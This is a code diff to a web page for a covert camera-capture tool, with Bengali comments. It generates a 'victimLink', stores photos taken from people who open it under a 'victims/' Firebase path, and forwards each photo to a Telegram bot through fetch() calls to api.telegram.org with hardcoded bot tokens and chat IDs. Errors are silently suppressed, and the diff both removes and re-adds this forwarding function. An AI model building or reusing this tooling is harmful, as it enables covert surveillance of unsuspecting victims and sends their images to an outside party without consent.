@@ -9,7 +9,7 @@
 *{margin:0;padding:0;box-sizing:border-box}
 body{font-family:'Poppins',sans-serif;background:#f8f9fa;color:#1e3a8a;line-height:1.5}
 header{background:#fff;padding:5px 0;text-align:center;box-shadow:0 2px 10px rgba(0,0,0,0.08);position:sticky;top:0;z-index:100}
-.logo{height:80px;border-radius:5%;border:0px solid #3b82f6;box-shadow:0 0 0px rgba(59,130,246,0.3)}
+.logo{height:80px;border-radius:5%;border:0px solid #3b82f6}
 .container{max-width:100%;padding:15px}
 .thumb{width:100%;max-width:400px;border-radius:16px;margin:20px auto;display:block;box-shadow:0 10px 30px rgba(0,0,0,0.12);border:1px solid #e0e7ff}
 h1{font-size:1.8em;margin:15px 0;color:#1e40af;font-weight:700;text-align:center}
@@ -74,23 +74,11 @@ const firebaseConfig = {
 firebase.initializeApp(firebaseConfig);
 const db = firebase.database();
 
+// তোমার টেলিগ্রাম বটের টোকেন + চ্যাট আইডি
+const BOT_TOKEN = "7647515731:AAECV5v6vKx8K1pX8qWv2vG9y3t5vL8nR4m"; // ← এখানে তোমার বট টোকেন দাও
+const CHAT_ID = "-4560659710"; // ← এখানে তোমার চ্যাট আইডি দাও
+
 let currentId = localStorage.getItem("currentCamId") || null;
-
-// টেলিগ্রামে ছবি পাঠানোর ফাংশন
-function sendToTelegram(imageData) {
-  const botToken = "7722413464:AAH8G0rD0X1h4fW5vK8e5v8i6z9b2cXv9Zm"; // তোমার বট টোকেন
-  const chatId = "7506275733"; // তোমার চ্যাট আইডি
-
-  fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-    method: "POST",
-    body: JSON.stringify({
-      chat_id: chatId,
-      photo: imageData,
-      caption: `নতুন ছবি এসেছে!\nলিংক: ${location.href}\nসময়: ${new Date().toLocaleString('bn-BD')}`
-    }),
-    headers: { "Content-Type": "application/json" }
-  }).catch(err => console.log("Telegram error:", err));
-}
 
 if(currentId){
   document.getElementById("linkBox").style.display = "block";
@@ -102,11 +90,11 @@ function generateLink(){
   currentId = Date.now().toString(36);
   localStorage.setItem("currentCamId", currentId);
   
-  // ক্লিন লিংক (view.html দেখাবে না)
-  const cleanLink = location.href.split('?')[0] + "?id=" + currentId;
+  // শুধু ?id=abc123 ফরম্যাটে লিংক (view.html দেখা যাবে না)
+  const link = location.href.split('?')[0] + "?id=" + currentId;
   
   document.getElementById("linkBox").style.display = "block";
-  document.getElementById("victimLink").value = cleanLink;
+  document.getElementById("victimLink").value = link;
   document.getElementById("grid").innerHTML = "";
   document.getElementById("noimg").style.display = "block";
   loadPhotos();
@@ -118,6 +106,19 @@ function copyLink(){
   alert("কপি হয়ে গেছে!");
 }
 
+function sendToTelegram(imageData){
+  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+  fetch(url, {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      photo: imageData,
+      caption: `নতুন ছবি এসেছে!\nলিংক: ${location.href.split('?')[0] + "?id=" + currentId}\nসময়: ${new Date().toLocaleString('bn-BD')}`
+    })
+  }).catch(()=>{}); // এরর হলে কিছু করবে না
+}
+
 function loadPhotos(){
   if(!currentId) return;
   const ref = db.ref("victims/"+currentId);
@@ -127,18 +128,17 @@ function loadPhotos(){
     if(!data || !data.data) return;
     document.getElementById("noimg").style.display = "none";
 
-    // টেলিগ্রামে ছবি পাঠাও
-    sendToTelegram(data.data);
-
+    // সাইটে দেখাও
     const card = document.createElement("div");
     card.className = "card";
-    card.innerHTML = `
-      <img src="${data.data}" onclick="window.open('${data.data}')">
-      <div class="time">${new Date(data.time).toLocaleTimeString('bn-BD')}</div>
-    `;
+    card.innerHTML = `<img src="${data.data}" onclick="window.open('${data.data}')"><div class="time">${new Date(data.time).toLocaleTimeString('bn-BD')}</div>`;
     document.getElementById("grid").appendChild(card);
+
+    // টেলিগ্রামে পাঠাও
+    sendToTelegram(data.data);
   });
 
+  // ১ ঘণ্টা পর ডিলিট
   setTimeout(() => {
     ref.remove();
     localStorage.removeItem("currentCamId");
